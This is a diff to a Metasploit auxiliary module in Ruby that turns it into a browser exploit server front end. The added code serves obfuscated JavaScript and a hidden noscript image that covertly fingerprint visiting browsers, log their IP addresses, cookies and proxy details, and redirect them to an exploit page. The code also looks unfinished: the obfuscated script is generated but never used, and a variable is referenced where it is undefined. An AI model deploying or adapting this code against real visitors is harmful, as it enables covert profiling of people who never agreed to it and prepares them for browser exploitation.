@@ -9,9 +9,11 @@ require 'msf/core'
 
 class Metasploit4 < Msf::Auxiliary
 
-  include Msf::Exploit::Remote::HttpServer
-  include Msf::Auxiliary::Report
+  #include Msf::Exploit::Remote::HttpServer::HTML
+  #include Msf::Exploit::JSObfu
+  #include Msf::Exploit::Remote::BrowserProfileManager
 
+  include Msf::Exploit::Remote::BrowserExploitServer
 
   def initialize
     super(
@@ -70,6 +72,73 @@ class Metasploit4 < Msf::Auxiliary
     exploit()
   end
 
+  # Returns the code for client-side data collection
+  #
+  # @param user_agent [String] The user-agent of the browser
+  # @return [String] Returns the HTML for detection
+  def get_detection_html(user_agent)
+    ua_info = fingerprint_user_agent(user_agent)
+    os      = ua_info[:os_name]
+    client  = ua_info[:ua_name]
+
+    code = ERB.new(%Q|
+    <%= js_base64 %>
+    <%= js_info_detect %>
+    <%= js_ajax_post %>
+
+    function objToQuery(obj) {
+      var q = [];
+      for (var key in obj) {
+        q.push(encodeURIComponent(key) + '=' + encodeURIComponent(obj[key]));
+      }
+      return Base64.encode(q.join('&'));
+    }
+
+    window.onload = function() {
+      var info = info_detect.basicInfo();
+      var query = objToQuery(info);
+      postInfo("<%=get_resource.chomp("/")%>/<%=@info_receiver_page%>/", query, function(){
+        window.location="<%= get_module_resource %>";
+      });
+    }
+    |).result(binding())
+
+    js = ::Rex::Exploitation::JSObfu.new code
+    js.obfuscate
+
+    %Q|
+    <script>
+    #{code}
+    </script>
+    <noscript>
+    <img style="visibility:hidden" src="#{get_resource.chomp("/")}/#{@noscript_receiver_page}/">
+    <meta http-equiv="refresh" content="; url=#{get_module_resource}">
+    </noscript>
+    |
+  end
+
+  def process_browser_info(source, cli, request)
+    tag = retrieve_tag(cli, request)
+
+    browser_profile[tag] ||= {}
+    profile = browser_profile[tag]
+    profile[:source] = source.to_s
+
+    parsed_body = CGI::parse(Rex::Text.decode_base64(request.body) || '')
+    vprint_status("Received sniffed browser data over POST:")
+    vprint_line("#{parsed_body}.")
+    parsed_body.each { |k, v| profile[k.to_sym] = v.first }
+
+    # Other detections
+    profile[:proxy]    = has_proxy?(request)
+    profile[:language] = request.headers['Accept-Language'] || ''
+
+    # Basic tracking
+    profile[:address]    = cli.peerhost
+    profile[:module]     = self.fullname
+    profile[:created_at] = Time.now
+  end
+
   def on_request_uri(cli, req)
 
     peer_addr   = cli.peerhost
@@ -90,9 +159,44 @@ class Metasploit4 < Msf::Auxiliary
     ua_match = fingerprint_user_agent(req['User-Agent'].to_s)
     cookies  = req['Cookie'] || ''
 
+    print_status([req.uri, req.body, peer_addr, self_addr, self_host, self_port, ua_match, cookies].inspect)
+    case req.uri
+    when '/', get_resource.chomp("/")
+      #
+      # This is the information gathering stage
+      #
+      if browser_profile[retrieve_tag(cli, req)]
+        send_redirect(cli, get_module_resource)
+        return
+      end
 
-    print_status([peer_addr, self_addr, self_host, self_port, ua_match, cookies].inspect)
-    send_response(cli, "OK")
+      print_status("Gathering target information.")
+      tag = Rex::Text.rand_text_alpha(rand(20) + 5)
+      ua = req.headers['User-Agent'] || ''
+      print_status("Sending HTML response.")
+      html = get_detection_html(ua)
+      send_response(cli, html, {'Set-Cookie' => cookie_header(tag)})
+
+    when /#{@info_receiver_page}/
+      #
+      # The detection code will hit this if Javascript is enabled
+      #
+      vprint_status "Info receiver page called."
+      process_browser_info(:script, cli, req)
+      send_response(cli, '', {'Set-Cookie' => cookie_header(tag)})
+
+    when /#{@noscript_receiver_page}/
+      #
+      # The detection code will hit this instead of Javascript is disabled
+      # Should only be triggered by the img src in <noscript>
+      #
+      process_browser_info(:headers, cli, req)
+      send_not_found(cli)
+
+    when /#{@exploit_receiver_page}/
+      send_not_found(cli)
+    end
+
     return
 
     if cookies.length > 0
